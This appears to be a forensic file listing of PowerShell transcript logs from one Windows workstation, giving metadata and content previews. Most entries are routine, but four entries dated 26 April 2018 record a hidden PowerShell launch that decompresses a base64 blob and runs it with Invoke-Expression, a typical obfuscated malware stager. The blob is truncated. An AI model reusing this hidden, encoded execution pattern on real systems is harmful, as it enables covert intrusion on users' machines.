(C:\Users\maxpowers\Documents\20180319)",".txt","document","Document","text/plain","False","PowerShell_transcript.DESKTOP-EDSLQM8.I8VuZMDY.20180319101703.txt","1077936503","0","**********************
+Windows PowerShell transcript start
+Start time: 20180319101703
+Username: DESKTOP-EDSLQM8\maxpowers
+RunAs User: DESKTOP-EDSLQM8\maxpowers
+Configuration Name: 
+Machine: DESKTOP-EDSLQM8 (Microsoft Windows NT 10.0.16299.0)
+Host Application: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -noprofile -ExecutionPolicy RemoteSigned -command [Console]::OutputEncoding=[System.Text.Encoding]::UTF8
+$output=[environment]::GetEnvironmentVariable('Path','User')
+[Console]::WriteLine($output)
+Process ID: 5808
+PSVersion: 5.1.16299.251
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.16299.251
+BuildVersion: 10.0.16299.251
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+PS>[Console]::OutputEncoding=[System.Text.Encoding]::UTF8
+$output=[environment]::GetEnvironmentVariable('Path','User')
+[Console]::WriteLine($output)
+PS>$global:?
+True
+**********************
+Windows Powe","19/03/2018 16:17:12.1699751","0,015625","file","F550B0A6A25B477F","804cb650-0000-0000-0000-501f00000000","Text Document","2395"
+"0701B8801028E0F34635D6501A6C4648","140015124E12","PowerShell_transcript.DESKTOP-EDSLQM8.JMx6ifiR.20180319105553.txt","779","Archive (32)","19/03/2018 16:55:58.2637499","19/03/2018 16:55:53.6074514","19/03/2018 16:55:53.6074514","file:C:/Users/maxpowers/Documents/20180319/PowerShell_transcript.DESKTOP-EDSLQM8.JMx6ifiR.20180319105553.txt","20180319","DESKTOP-EDSLQM8","text/plain","19/03/2018 16:55:54.0000000","19/03/2018 16:55:54.0000000","19/03/2018 16:55:58.2637499",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","19/03/2018 16:55:58.2637499","C:\Users\maxpowers\Documents\20180319","20180319 (C:\Users\maxpowers\Documents)","PowerShell_transcript.DESKTOP-EDSLQM8.JMx6ifiR.20180319105553.txt","PowerShell_transcript.DESKTOP-EDSLQM8.JMx6ifiR.20180319105553.txt","PowerShell_transcript.DESKTOP-EDSLQM8.JMx6ifiR.20180319105553","C:\Users\maxpowers\Documents\20180319\PowerShell_transcript.DESKTOP-EDSLQM8.JMx6ifiR.20180319105553.txt","PowerShell_transcript.DESKTOP-EDSLQM8.JMx6ifiR.20180319105553 (C:\Users\maxpowers\Documents\20180319)",".txt","document","Document","text/plain","False","PowerShell_transcript.DESKTOP-EDSLQM8.JMx6ifiR.20180319105553.txt","1077936503","0","**********************
+Windows PowerShell transcript start
+Start time: 20180319105553
+Username: DESKTOP-EDSLQM8\maxpowers
+RunAs User: DESKTOP-EDSLQM8\maxpowers
+Configuration Name: 
+Machine: DESKTOP-EDSLQM8 (Microsoft Windows NT 10.0.16299.0)
+Host Application: PowerShell.exe -noexit -command Set-Location -literalPath 'C:\Users\maxpowers\Documents\stuff'
+Process ID: 4476
+PSVersion: 5.1.16299.251
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.16299.251
+BuildVersion: 10.0.16299.251
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+PS>Set-Location -literalPath 'C:\Users\maxpowers\Documents\stuff'
+PS C:\Users\maxpowers\Documents\stuff> start cmd
+","19/03/2018 16:55:58.6133611","0,03125","file","816AFC8E12E36C21","804cb650-0000-0000-0000-501f00000000","Text Document","2396"
+"C7547C5DEFDA02EA02B095B35AAF78C7","140015124E12","PowerShell_transcript.DESKTOP-EDSLQM8.RomKX4lG.20180320133845.txt","3492","Archive (32)","20/03/2018 19:38:47.3234449","20/03/2018 19:38:45.1830952","20/03/2018 19:38:45.1830952","file:C:/Users/maxpowers/Documents/20180320/PowerShell_transcript.DESKTOP-EDSLQM8.RomKX4lG.20180320133845.txt","20180320","DESKTOP-EDSLQM8","text/plain","20/03/2018 19:38:46.0000000","20/03/2018 19:38:46.0000000","20/03/2018 19:38:47.3234449",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","20/03/2018 19:38:47.3234449","C:\Users\maxpowers\Documents\20180320","20180320 (C:\Users\maxpowers\Documents)","PowerShell_transcript.DESKTOP-EDSLQM8.RomKX4lG.20180320133845.txt","PowerShell_transcript.DESKTOP-EDSLQM8.RomKX4lG.20180320133845.txt","PowerShell_transcript.DESKTOP-EDSLQM8.RomKX4lG.20180320133845","C:\Users\maxpowers\Documents\20180320\PowerShell_transcript.DESKTOP-EDSLQM8.RomKX4lG.20180320133845.txt","PowerShell_transcript.DESKTOP-EDSLQM8.RomKX4lG.20180320133845 (C:\Users\maxpowers\Documents\20180320)",".txt","document","Document","text/plain","False","PowerShell_transcript.DESKTOP-EDSLQM8.RomKX4lG.20180320133845.txt","1077936503","0","**********************
+Windows PowerShell transcript start
+Start time: 20180320133845
+Username: DESKTOP-EDSLQM8\maxpowers
+RunAs User: DESKTOP-EDSLQM8\maxpowers
+Configuration Name: 
+Machine: DESKTOP-EDSLQM8 (Microsoft Windows NT 10.0.16299.0)
+Host Application: C:\WINDOWS\System32\sdiagnhost.exe -Embedding
+Process ID: 1568
+PSVersion: 5.1.16299.251
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.16299.251
+BuildVersion: 10.0.16299.251
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+PS>CommandInvocation(Set-Location): ""Set-Location""
+>> ParameterBinding(Set-Location): name=""Path""; value=""C:\WINDOWS\TEMP\SDIAG_ecd17cef-25df-4783-9c0c-5463ae6ad2ec""
+PS>& ""C:\WINDOWS\TEMP\SDIAG_ecd17cef-25df-4783-9c0c-5463ae6ad2ec\TS_WERQueue.ps1""
+**********************
+Windows PowerShell transcript start
+Start time: 20180320133846
+Username: DESKTOP-EDSLQM8\maxpowers
+RunAs User: DESKTOP-EDSLQM8\maxpowers","20/03/2018 19:39:16.1048238","0","file","D2BEB62E4662FBA7","804cb650-0000-0000-0000-501f00000000","Text Document","2401"
+"74FCBDDC7758DE20A6B24DE5EE1E2E93","140015124E12","PowerShell_transcript.DESKTOP-EDSLQM8.5HpsS60_.20180403154021.txt","3492","Archive (32)","03/04/2018 21:40:23.1103247","03/04/2018 21:40:21.1728908","03/04/2018 21:40:21.1728908","file:C:/Users/maxpowers/Documents/20180403/PowerShell_transcript.DESKTOP-EDSLQM8.5HpsS60_.20180403154021.txt","20180403","DESKTOP-EDSLQM8","text/plain","03/04/2018 21:40:22.0000000","03/04/2018 21:40:22.0000000","03/04/2018 21:40:23.1103247",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","03/04/2018 21:40:23.1103247","C:\Users\maxpowers\Documents\20180403","20180403 (C:\Users\maxpowers\Documents)","PowerShell_transcript.DESKTOP-EDSLQM8.5HpsS60_.20180403154021.txt","PowerShell_transcript.DESKTOP-EDSLQM8.5HpsS60_.20180403154021.txt","PowerShell_transcript.DESKTOP-EDSLQM8.5HpsS60_.20180403154021","C:\Users\maxpowers\Documents\20180403\PowerShell_transcript.DESKTOP-EDSLQM8.5HpsS60_.20180403154021.txt","PowerShell_transcript.DESKTOP-EDSLQM8.5HpsS60_.20180403154021 (C:\Users\maxpowers\Documents\20180403)",".txt","document","Document","text/plain","False","PowerShell_transcript.DESKTOP-EDSLQM8.5HpsS60_.20180403154021.txt","1077936503","0","**********************
+Windows PowerShell transcript start
+Start time: 20180403154021
+Username: DESKTOP-EDSLQM8\maxpowers
+RunAs User: DESKTOP-EDSLQM8\maxpowers
+Configuration Name: 
+Machine: DESKTOP-EDSLQM8 (Microsoft Windows NT 10.0.16299.0)
+Host Application: C:\WINDOWS\System32\sdiagnhost.exe -Embedding
+Process ID: 5620
+PSVersion: 5.1.16299.251
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.16299.251
+BuildVersion: 10.0.16299.251
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+PS>CommandInvocation(Set-Location): ""Set-Location""
+>> ParameterBinding(Set-Location): name=""Path""; value=""C:\WINDOWS\TEMP\SDIAG_9986555f-50a8-4bb6-a24f-0aed57f51cec""
+PS>& ""C:\WINDOWS\TEMP\SDIAG_9986555f-50a8-4bb6-a24f-0aed57f51cec\TS_WERQueue.ps1""
+**********************
+Windows PowerShell transcript start
+Start time: 20180403154021
+Username: DESKTOP-EDSLQM8\maxpowers
+RunAs User: DESKTOP-EDSLQM8\maxpowers","03/04/2018 21:40:23.2042442","0,03125","file","A95CEC7AA370A00D","804cb650-0000-0000-0000-501f00000000","Text Document","2426"
+"576B260AA8423E9CA26FE8952AD73B7C","140015124E12","PowerShell_transcript.DESKTOP-EDSLQM8.z0HOIQZY.20180426093753.txt","3709","Archive (32)","26/04/2018 15:37:55.3804416","26/04/2018 15:37:54.1773010","26/04/2018 15:37:54.1773010","file:C:/Users/maxpowers/Documents/20180426/PowerShell_transcript.DESKTOP-EDSLQM8.z0HOIQZY.20180426093753.txt","20180426","DESKTOP-EDSLQM8","text/plain","26/04/2018 15:37:55.3804416","26/04/2018 15:37:55.3804416","26/04/2018 15:37:55.3804416",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","26/04/2018 15:37:55.3804416","C:\Users\maxpowers\Documents\20180426","20180426 (C:\Users\maxpowers\Documents)","PowerShell_transcript.DESKTOP-EDSLQM8.z0HOIQZY.20180426093753.txt","PowerShell_transcript.DESKTOP-EDSLQM8.z0HOIQZY.20180426093753.txt","PowerShell_transcript.DESKTOP-EDSLQM8.z0HOIQZY.20180426093753","C:\Users\maxpowers\Documents\20180426\PowerShell_transcript.DESKTOP-EDSLQM8.z0HOIQZY.20180426093753.txt","PowerShell_transcript.DESKTOP-EDSLQM8.z0HOIQZY.20180426093753 (C:\Users\maxpowers\Documents\20180426)",".txt","document","Document","text/plain","False","PowerShell_transcript.DESKTOP-EDSLQM8.z0HOIQZY.20180426093753.txt","1077936503","0","**********************
+Windows PowerShell transcript start
+Start time: 20180426093754
+Username: DESKTOP-EDSLQM8\maxpowers
+RunAs User: DESKTOP-EDSLQM8\maxpowers
+Configuration Name: 
+Machine: DESKTOP-EDSLQM8 (Microsoft Windows NT 10.0.16299.0)
+Host Application: C:\Windows\syswow64\windowspowershell\v1.0\powershell.exe -NoP -NonI -W Hidden -Command Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String("" pVZNj9s2EL37VxCGDjbWWlAS9eEYCyRtUCBAkQbdbXswfKAoqiuUlgSJzno37X8vZyRS1joBivQy5HCGb97MUKQ8Qe7I2+Vi/16pD8e26fRq+Zfsaqmi8LZQark+kPaUq0qQXnNtBnnWxk4+1PqT7sjvVadPXL1TqhGrce1pQ05Vrcl5HJ/H8WW9++44P3aSa/nwaIbCxjmNuJ83ZIo8zi5ijyuvox/7z6LT/yX2UR57qVfXyN+fVd40ytbuU9doKRy+at8VRSf7fsQvnu6rFzkqpfoon8YNG9Kc9LCs2lL9oorRYAgt3y68xnTWQPkPz60kvkkil917WVZ1paumJp4g/kd+lGT5R1VH4ZL4tdH6lgtJcOWnUy3Asyd+y/teP3anhXe+85o3b2Zdpxt6DiiFIRoGytY7sv/hWcv94eD1cMTouRTGIjMjshB86EwkILItuMQAFBgh0MDAkBsRDxGciihipgbOOQU1hGi0NCJPjWAc1hILX4KBA0AEIoG1FGY","26/04/2018 15:37:57.2242502","0,015625","file","F091BF5274A378A5","804cb650-0000-0000-0000-501f00000000","Text Document","2428"
+"4B1B20C9F46807D63146F8D1D30F3902","140015124E12","PowerShell_transcript.DESKTOP-EDSLQM8.doHem5wf.20180426094005.txt","3709","Archive (32)","26/04/2018 15:40:38.9432095","26/04/2018 15:40:05.9742011","26/04/2018 15:40:05.9742011","file:C:/Users/maxpowers/Documents/20180426/PowerShell_transcript.DESKTOP-EDSLQM8.doHem5wf.20180426094005.txt","20180426","DESKTOP-EDSLQM8","text/plain","26/04/2018 15:40:06.0000000","26/04/2018 15:40:06.0000000","26/04/2018 15:40:38.9432095",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","26/04/2018 15:40:38.9432095","C:\Users\maxpowers\Documents\20180426","20180426 (C:\Users\maxpowers\Documents)","PowerShell_transcript.DESKTOP-EDSLQM8.doHem5wf.20180426094005.txt","PowerShell_transcript.DESKTOP-EDSLQM8.doHem5wf.20180426094005.txt","PowerShell_transcript.DESKTOP-EDSLQM8.doHem5wf.20180426094005","C:\Users\maxpowers\Documents\20180426\PowerShell_transcript.DESKTOP-EDSLQM8.doHem5wf.20180426094005.txt","PowerShell_transcript.DESKTOP-EDSLQM8.doHem5wf.20180426094005 (C:\Users\maxpowers\Documents\20180426)",".txt","document","Document","text/plain","False","PowerShell_transcript.DESKTOP-EDSLQM8.doHem5wf.20180426094005.txt","1077936503","0","**********************
+Windows PowerShell transcript start
+Start time: 20180426094005
+Username: DESKTOP-EDSLQM8\maxpowers
+RunAs User: DESKTOP-EDSLQM8\maxpowers
+Configuration Name: 
+Machine: DESKTOP-EDSLQM8 (Microsoft Windows NT 10.0.16299.0)
+Host Application: C:\Windows\syswow64\windowspowershell\v1.0\powershell.exe -NoP -NonI -W Hidden -Command Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String("" pVZNj9s2EL37VxCGDjbWWlAS9eEYCyRtUCBAkQbdbXswfKAoqiuUlgSJzno37X8vZyRS1joBivQy5HCGb97MUKQ8Qe7I2+Vi/16pD8e26fRq+Zfsaqmi8LZQark+kPaUq0qQXnNtBnnWxk4+1PqT7sjvVadPXL1TqhGrce1pQ05Vrcl5HJ/H8WW9++44P3aSa/nwaIbCxjmNuJ83ZIo8zi5ijyuvox/7z6LT/yX2UR57qVfXyN+fVd40ytbuU9doKRy+at8VRSf7fsQvnu6rFzkqpfoon8YNG9Kc9LCs2lL9oorRYAgt3y68xnTWQPkPz60kvkkil917WVZ1paumJp4g/kd+lGT5R1VH4ZL4tdH6lgtJcOWnUy3Asyd+y/teP3anhXe+85o3b2Zdpxt6DiiFIRoGytY7sv/hWcv94eD1cMTouRTGIjMjshB86EwkILItuMQAFBgh0MDAkBsRDxGciihipgbOOQU1hGi0NCJPjWAc1hILX4KBA0AEIoG1FGY","26/04/2018 15:40:38.9898676","0,015625","file","D1D48D46A51280F1","804cb650-0000-0000-0000-501f00000000","Text Document","2430"
+"E2B06E8DB61C3D0692B5CA75FD25AA3E","140015124E12","PowerShell_transcript.DESKTOP-EDSLQM8.Wb6OXvg9.20180410173852.txt","3492","Archive (32)","10/04/2018 23:38:54.0871162","10/04/2018 23:38:52.2119404","10/04/2018 23:38:52.2119404","file:C:/Users/maxpowers/Documents/20180410/PowerShell_transcript.DESKTOP-EDSLQM8.Wb6OXvg9.20180410173852.txt","20180410","DESKTOP-EDSLQM8","text/plain","10/04/2018 23:38:54.0000000","10/04/2018 23:38:54.0000000","10/04/2018 23:38:54.0871162",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","10/04/2018 23:38:54.0871162","C:\Users\maxpowers\Documents\20180410","20180410 (C:\Users\maxpowers\Documents)","PowerShell_transcript.DESKTOP-EDSLQM8.Wb6OXvg9.20180410173852.txt","PowerShell_transcript.DESKTOP-EDSLQM8.Wb6OXvg9.20180410173852.txt","PowerShell_transcript.DESKTOP-EDSLQM8.Wb6OXvg9.20180410173852","C:\Users\maxpowers\Documents\20180410\PowerShell_transcript.DESKTOP-EDSLQM8.Wb6OXvg9.20180410173852.txt","PowerShell_transcript.DESKTOP-EDSLQM8.Wb6OXvg9.20180410173852 (C:\Users\maxpowers\Documents\20180410)",".txt","document","Document","text/plain","False","PowerShell_transcript.DESKTOP-EDSLQM8.Wb6OXvg9.20180410173852.txt","1077936503","0","**********************
+Windows PowerShell transcript start
+Start time: 20180410173852
+Username: DESKTOP-EDSLQM8\maxpowers
+RunAs User: DESKTOP-EDSLQM8\maxpowers
+Configuration Name: 
+Machine: DESKTOP-EDSLQM8 (Microsoft Windows NT 10.0.16299.0)
+Host Application: C:\WINDOWS\System32\sdiagnhost.exe -Embedding
+Process ID: 1936
+PSVersion: 5.1.16299.251
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.16299.251
+BuildVersion: 10.0.16299.251
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+PS>CommandInvocation(Set-Location): ""Set-Location""
+>> ParameterBinding(Set-Location): name=""Path""; value=""C:\WINDOWS\TEMP\SDIAG_dc0d1113-0a1f-410a-ba34-35c2c813954a""
+PS>& ""C:\WINDOWS\TEMP\SDIAG_dc0d1113-0a1f-410a-ba34-35c2c813954a\TS_WERQueue.ps1""
+**********************
+Windows PowerShell transcript start
+Start time: 20180410173852
+Username: DESKTOP-EDSLQM8\maxpowers
+RunAs User: DESKTOP-EDSLQM8\maxpowers","10/04/2018 23:38:54.1649146","0","file","36A6901A2A77669E","804cb650-0000-0000-0000-501f00000000","Text Document","2434"
+"13D44A0878BF291BC83A73B61FE8CE99","140015124E12","PowerShell_transcript.DESKTOP-EDSLQM8.rv2uZUBM.20180409104540.txt","1100","Archive (32)","09/04/2018 16:45:41.3625987","09/04/2018 16:45:41.1435351","09/04/2018 16:45:41.1435351","file:C:/Users/maxpowers/Documents/20180409/PowerShell_transcript.DESKTOP-EDSLQM8.rv2uZUBM.20180409104540.txt","20180409","DESKTOP-EDSLQM8","text/plain","09/04/2018 16:45:41.3625987","09/04/2018 16:45:41.3625987","09/04/2018 16:45:41.3625987",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","09/04/2018 16:45:41.3625987","C:\Users\maxpowers\Documents\20180409","20180409 (C:\Users\maxpowers\Documents)","PowerShell_transcript.DESKTOP-EDSLQM8.rv2uZUBM.20180409104540.txt","PowerShell_transcript.DESKTOP-EDSLQM8.rv2uZUBM.20180409104540.txt","PowerShell_transcript.DESKTOP-EDSLQM8.rv2uZUBM.20180409104540","C:\Users\maxpowers\Documents\20180409\PowerShell_transcript.DESKTOP-EDSLQM8.rv2uZUBM.20180409104540.txt","PowerShell_transcript.DESKTOP-EDSLQM8.rv2uZUBM.20180409104540 (C:\Users\maxpowers\Documents\20180409)",".txt","document","Document","text/plain","False","PowerShell_transcript.DESKTOP-EDSLQM8.rv2uZUBM.20180409104540.txt","1077936503","0","**********************
+Windows PowerShell transcript start
+Start time: 20180409104541
+Username: DESKTOP-EDSLQM8\maxpowers
+RunAs User: DESKTOP-EDSLQM8\maxpowers
+Configuration Name: 
+Machine: DESKTOP-EDSLQM8 (Microsoft Windows NT 10.0.16299.0)
+Host Application: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -noprofile -ExecutionPolicy RemoteSigned -command [Console]::OutputEncoding=[System.Text.Encoding]::UTF8
+$output=[environment]::GetEnvironmentVariable('Path','User')
+[Console]::WriteLine($output)
+Process ID: 7684
+PSVersion: 5.1.16299.251
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.16299.251
+BuildVersion: 10.0.16299.251
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+PS>[Console]::OutputEncoding=[System.Text.Encoding]::UTF8
+$output=[environment]::GetEnvironmentVariable('Path','User')
+[Console]::WriteLine($output)
+PS>$global:?
+True
+**********************
+Windows Powe","09/04/2018 16:45:43.8628058","0","file","C931CF2A8DC6BC88",,"Text Document","2435"
+"EA1DDE466FFBF738880DE4688039419B","140015124E12","PowerShell_transcript.DESKTOP-EDSLQM8.zekZRqZU.20180409112917.txt","701","Archive (32)","09/04/2018 17:29:37.9092986","09/04/2018 17:29:18.0096804","09/04/2018 17:29:18.0096804","file:C:/Users/maxpowers/Documents/20180409/PowerShell_transcript.DESKTOP-EDSLQM8.zekZRqZU.20180409112917.txt","20180409","DESKTOP-EDSLQM8","text/plain","09/04/2018 17:29:20.0000000","09/04/2018 17:29:20.0000000","09/04/2018 17:29:37.9092986",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","09/04/2018 17:29:37.9092986","C:\Users\maxpowers\Documents\20180409","20180409 (C:\Users\maxpowers\Documents)","PowerShell_transcript.DESKTOP-EDSLQM8.zekZRqZU.20180409112917.txt","PowerShell_transcript.DESKTOP-EDSLQM8.zekZRqZU.20180409112917.txt","PowerShell_transcript.DESKTOP-EDSLQM8.zekZRqZU.20180409112917","C:\Users\maxpowers\Documents\20180409\PowerShell_transcript.DESKTOP-EDSLQM8.zekZRqZU.20180409112917.txt","PowerShell_transcript.DESKTOP-EDSLQM8.zekZRqZU.20180409112917 (C:\Users\maxpowers\Documents\20180409)",".txt","document","Document","text/plain","False","PowerShell_transcript.DESKTOP-EDSLQM8.zekZRqZU.20180409112917.txt","1077936503","0","**********************
+Windows PowerShell transcript start
+Start time: 20180409112918
+Username: DESKTOP-EDSLQM8\maxpowers
+RunAs User: DESKTOP-EDSLQM8\maxpowers
+Configuration Name: 
+Machine: DESKTOP-EDSLQM8 (Microsoft Windows NT 10.0.16299.0)
+Host Application: PowerShell.exe -noexit -command Set-Location -literalPath 'C:\Projects\ProjectC'
+Process ID: 6692
+PSVersion: 5.1.16299.251
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.16299.251
+BuildVersion: 10.0.16299.251
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+PS>Set-Location -literalPath 'C:\Projects\ProjectC'
+","09/04/2018 17:29:38.1854410","0,046875","file","BBEE392DC2195BFF","804cb650-0000-0000-0000-501f00000000","Text Document","2436"
+"235BD1DC2244A068FE416F00692E9ACA","140015124E12","PowerShell_transcript.DESKTOP-EDSLQM8.20avRYrR.20180426095058.txt","3709","Archive (32)","26/04/2018 15:52:10.0836008","26/04/2018 15:50:58.2866920","26/04/2018 15:50:58.2866920","file:C:/Users/maxpowers/Documents/20180426/PowerShell_transcript.DESKTOP-EDSLQM8.20avRYrR.20180426095058.txt","20180426","DESKTOP-EDSLQM8","text/plain","26/04/2018 15:51:00.0000000","26/04/2018 15:51:00.0000000","26/04/2018 15:52:10.0836008",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","26/04/2018 15:52:10.0836008","C:\Users\maxpowers\Documents\20180426","20180426 (C:\Users\maxpowers\Documents)","PowerShell_transcript.DESKTOP-EDSLQM8.20avRYrR.20180426095058.txt","PowerShell_transcript.DESKTOP-EDSLQM8.20avRYrR.20180426095058.txt","PowerShell_transcript.DESKTOP-EDSLQM8.20avRYrR.20180426095058","C:\Users\maxpowers\Documents\20180426\PowerShell_transcript.DESKTOP-EDSLQM8.20avRYrR.20180426095058.txt","PowerShell_transcript.DESKTOP-EDSLQM8.20avRYrR.20180426095058 (C:\Users\maxpowers\Documents\20180426)",".txt","document","Document","text/plain","False","PowerShell_transcript.DESKTOP-EDSLQM8.20avRYrR.20180426095058.txt","1077936503","0","**********************
+Windows PowerShell transcript start
+Start time: 20180426095058
+Username: DESKTOP-EDSLQM8\maxpowers
+RunAs User: DESKTOP-EDSLQM8\maxpowers
+Configuration Name: 
+Machine: DESKTOP-EDSLQM8 (Microsoft Windows NT 10.0.16299.0)
+Host Application: C:\Windows\syswow64\windowspowershell\v1.0\powershell.exe -NoP -NonI -W Hidden -Command Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String("" pVZNj9s2EL37VxCGDjbWWlAS9eEYCyRtUCBAkQbdbXswfKAoqiuUlgSJzno37X8vZyRS1joBivQy5HCGb97MUKQ8Qe7I2+Vi/16pD8e26fRq+Zfsaqmi8LZQark+kPaUq0qQXnNtBnnWxk4+1PqT7sjvVadPXL1TqhGrce1pQ05Vrcl5HJ/H8WW9++44P3aSa/nwaIbCxjmNuJ83ZIo8zi5ijyuvox/7z6LT/yX2UR57qVfXyN+fVd40ytbuU9doKRy+at8VRSf7fsQvnu6rFzkqpfoon8YNG9Kc9LCs2lL9oorRYAgt3y68xnTWQPkPz60kvkkil917WVZ1paumJp4g/kd+lGT5R1VH4ZL4tdH6lgtJcOWnUy3Asyd+y/teP3anhXe+85o3b2Zdpxt6DiiFIRoGytY7sv/hWcv94eD1cMTouRTGIjMjshB86EwkILItuMQAFBgh0MDAkBsRDxGciihipgbOOQU1hGi0NCJPjWAc1hILX4KBA0AEIoG1FGY","26/04/2018 15:52:10.5366975","0,046875","file","145541B3E559609C","804cb650-0000-0000-0000-501f00000000","Text Document","2437"
+"5B44FBE2F1E4FCC563B4B60DFE430DF1","140015124E12","PowerShell_transcript.DESKTOP-EDSLQM8.yzRhEPIk.20180409115511.txt","1171","Archive (32)","09/04/2018 17:55:21.0341751","09/04/2018 17:55:11.8935983","09/04/2018 17:55:11.8935983","file:C:/Users/maxpowers/Documents/20180409/PowerShell_transcript.DESKTOP-EDSLQM8.yzRhEPIk.20180409115511.txt","20180409","DESKTOP-EDSLQM8","text/plain","09/04/2018 17:55:12.0000000","09/04/2018 17:55:12.0000000","09/04/2018 17:55:21.0341751",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","09/04/2018 17:55:21.0341751","C:\Users\maxpowers\Documents\20180409","20180409 (C:\Users\maxpowers\Documents)","PowerShell_transcript.DESKTOP-EDSLQM8.yzRhEPIk.20180409115511.txt","PowerShell_transcript.DESKTOP-EDSLQM8.yzRhEPIk.20180409115511.txt","PowerShell_transcript.DESKTOP-EDSLQM8.yzRhEPIk.20180409115511","C:\Users\maxpowers\Documents\20180409\PowerShell_transcript.DESKTOP-EDSLQM8.yzRhEPIk.20180409115511.txt","PowerShell_transcript.DESKTOP-EDSLQM8.yzRhEPIk.20180409115511 (C:\Users\maxpowers\Documents\20180409)",".txt","document","Document","text/plain","False","PowerShell_transcript.DESKTOP-EDSLQM8.yzRhEPIk.20180409115511.txt","1077936503","0","**********************
+Windows PowerShell transcript start
+Start time: 20180409115511
+Username: DESKTOP-EDSLQM8\maxpowers
+RunAs User: DESKTOP-EDSLQM8\maxpowers
+Configuration Name: 
+Machine: DESKTOP-EDSLQM8 (Microsoft Windows NT 10.0.16299.0)
+Host Application: PowerShell.exe -noexit -command Set-Location -literalPath 'C:\Projects\ProjectC'
+Process ID: 7308
+PSVersion: 5.1.16299.251
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.16299.251
+BuildVersion: 10.0.16299.251
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+PS>Set-Location -literalPath 'C:\Projects\ProjectC'
+PS C:\Projects\ProjectC> python .\c_test.py
+{
+    ""RecordLength"": 96,
+    ""MajorVersion"": 2,
+    ""MinorVersion"": 0,
+    ""FileReferenceNumber"": 10477624533077459059,
+    ""ParentFileReferenceNumber"": 1970324837116475,
+    ""Usn"": 20342374400,
+    ""TimeStamp"": 130266586132760403,
+    ""Reason"": 2,
+    ""SourceInfo"": 0,
+","09/04/2018 17:55:24.5969072","0,046875","file","CFEACF0ADA1B73EF","804cb650-0000-0000-0000-501f00000000","Text Document","2438"
+"B483B7E08757177FBB492D906A2C0E26","140015124E12","PowerShell_transcript.DESKTOP-EDSLQM8.I2cSTzZ0.20180409120219.txt","701","Archive (32)","09/04/2018 18:02:19.4837614","09/04/2018 18:02:19.1713483","09/04/2018 18:02:19.1713483","file:C:/Users/maxpowers/Documents/20180409/PowerShell_transcript.DESKTOP-EDSLQM8.I2cSTzZ0.20180409120219.txt","20180409","DESKTOP-EDSLQM8","text/plain","09/04/2018 18:02:19.4837614","09/04/2018 18:02:19.4837614","09/04/2018 18:02:19.4837614",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","09/04/2018 18:02:19.4837614","C:\Users\maxpowers\Documents\20180409","20180409 (C:\Users\maxpowers\Documents)","PowerShell_transcript.DESKTOP-EDSLQM8.I2cSTzZ0.20180409120219.txt","PowerShell_transcript.DESKTOP-EDSLQM8.I2cSTzZ0.20180409120219.txt","PowerShell_transcript.DESKTOP-EDSLQM8.I2cSTzZ0.20180409120219","C:\Users\maxpowers\Documents\20180409\PowerShell_transcript.DESKTOP-EDSLQM8.I2cSTzZ0.20180409120219.txt","PowerShell_transcript.DESKTOP-EDSLQM8.I2cSTzZ0.20180409120219 (C:\Users\maxpowers\Documents\20180409)",".txt","document","Document","text/plain","False","PowerShell_transcript.DESKTOP-EDSLQM8.I2cSTzZ0.20180409120219.txt","1077936503","0","**********************
+Windows PowerShell transcript start
+Start time: 20180409120219
+Username: DESKTOP-EDSLQM8\maxpowers
+RunAs User: DESKTOP-EDSLQM8\maxpowers
+Configuration Name: 
+Machine: DESKTOP-EDSLQM8 (Microsoft Windows NT 10.0.16299.0)
